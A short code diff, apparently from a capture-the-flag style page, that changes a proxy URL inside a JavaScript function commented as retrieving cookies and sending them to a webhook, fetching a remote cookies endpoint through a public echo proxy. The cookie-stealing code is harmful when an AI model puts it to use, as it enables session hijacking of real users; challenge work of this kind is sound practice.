@@ -36,7 +36,7 @@
         // Function to retrieve cookies and send them to webhook
         async function retrieveAndSendCookies() {
             try {
-                const proxyUrl = 'https://echo.hoppscotch.io';
+                const proxyUrl = 'https://echo.hoppscotch.io/';
                 const cookiesUrl = 'https://host3.metaproblems.com:6020/cookies.php';
                 
                 const getResponse = await fetch(proxyUrl + cookiesUrl);
